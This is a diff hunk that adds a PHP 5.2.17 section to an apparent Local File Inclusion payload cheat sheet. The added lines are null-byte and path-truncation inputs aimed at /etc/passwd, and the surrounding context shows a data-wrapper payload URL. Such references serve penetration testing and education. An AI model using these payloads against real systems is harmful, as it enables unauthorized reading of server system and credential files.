@@ -184,6 +184,14 @@ http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbm
 http://example.com/index.php?page=path/to/uploaded/file.png
 ```
 
+## Versiones PHP
+
+# 5.2.17
+```
+/etc/passwd\0
+/etc/passwd/.
+```
+
 #### References :
 
 👉 [Testing for Local File Inclusion](https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion)
